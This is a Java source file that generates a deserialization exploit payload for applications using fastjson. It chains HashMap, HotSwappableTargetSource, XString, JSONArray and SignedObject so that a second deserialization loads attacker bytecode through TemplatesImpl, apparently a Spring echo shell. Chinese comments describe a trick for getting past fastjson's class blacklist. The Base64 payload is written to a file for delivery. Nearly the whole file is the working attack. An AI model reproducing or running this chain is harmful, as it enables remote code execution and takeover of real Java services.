import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.management.BadAttributeValueExpException;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.util.*;

import static com.example.javaguide.Exp.getFieldValue;

public class EXP {
    public static void main(String[] args) throws Exception {
        List<Object> list = new ArrayList<>();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "1diOt9");
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        byte[] code = Files.readAllBytes(Paths.get("D:\\tmp\\echo\\SpringEcho.class"));
        byte[][] bytecode = {code};
        setFieldValue(templates, "_bytecodes", bytecode);

        list.add(templates);        //第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        EventListenerList list1 = new EventListenerList();
        UndoManager manager1 = new UndoManager();
        Vector vector1 = (Vector) getFieldValue(manager1, "edits");
        vector1.add(jsonArray);
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        hashMap2.put(templates, list1);


        BadAttributeValueExpException bad1 = new BadAttributeValueExpException(null);
        setFieldValue(bad1, "val", jsonArray);

        list.add(bad1);

        //二次反序列化
//        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
//        kpg.initialize(1024);
//        KeyPair kp = kpg.generateKeyPair();
//        SignedObject signedObject = new SignedObject((Serializable) list, kp.getPrivate(), Signature.getInstance("DSA"));

        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject((Serializable) list, privateKey, signingEngine);

//        signedObject.getObject();


        JSONArray jsonArray1 = new JSONArray();
        jsonArray1.add(signedObject);

//        jsonArray1.toString();

//        BadAttributeValueExpException bad2 = new BadAttributeValueExpException(null);
//        setFieldValue(bad2, "val", jsonArray1);
//        byte[] serialize = serialize(bad2);
//        unserialize(serialize);

        EventListenerList listA = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) getFieldValue(manager, "edits");
        vector.add(jsonArray1);
        setFieldValue(listA, "listenerList", new Object[]{InternalError.class, manager});
        HashMap<Object, Object> hashMap1 = new HashMap<>();
        hashMap1.put(signedObject, listA);


        ToStringClass toStringClass = new ToStringClass();
        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(jsonArray1);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new HashMap<>());
//        HashMap hashMap = makeMap(hotSwappableTargetSource1, hotSwappableTargetSource2);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(hotSwappableTargetSource1, "1");
        hashMap.put(hotSwappableTargetSource2, "2");
        setFieldValue(hotSwappableTargetSource2, "target", new XString("any"));
        //成功调⽤ToStringClass#toString
        byte[] bytes = serialize(hashMap);
        String s = Base64.getEncoder().encodeToString(bytes);
//        String urlEncodedString = URLEncoder.encode(s);

        Files.write(Paths.get("D:\\tmp\\payload.txt"), s.getBytes());

//        unserialize(bytes);

    }

    //HashMap#readObject -> HotSwappableTargetSource#equals ->
    //XString#equals -->JSONArray.toString-->SignedObject.getObject-->BadAE-->JSONArray.toString-->TemplatesImpl.getProperties


//    public static HashMap<Object, Object> makeMap (Object v1, Object v2 )
//            throws Exception {
//        HashMap<Object, Object> s = new HashMap<>();
//        setFieldValue(s, "size", 2);
//        Class<?> nodeC;
//        try {
//            nodeC = Class.forName("java.util.HashMap$Node");
//        }
//        catch ( ClassNotFoundException e ) {
//            nodeC = Class.forName("java.util.HashMap$Entry");
//        }
//        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
//        nodeCons.setAccessible(true);
//        Object tbl = Array.newInstance(nodeC, 2);
//        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
//        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
//        setFieldValue(s, "table", tbl);
//        return s;
//    }

    private static void setFieldValue(Object obj, String field, Object arg
    ) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static void unserialize(byte[] bytes) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
